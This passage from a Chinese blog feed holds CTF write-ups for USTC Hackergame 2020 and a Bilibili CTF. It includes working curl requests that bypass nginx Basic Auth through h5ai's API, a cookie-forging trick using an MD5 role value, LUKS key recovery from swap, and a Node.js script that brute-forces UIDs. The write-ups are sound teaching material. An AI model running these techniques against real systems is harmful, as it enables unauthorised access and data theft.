}})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy 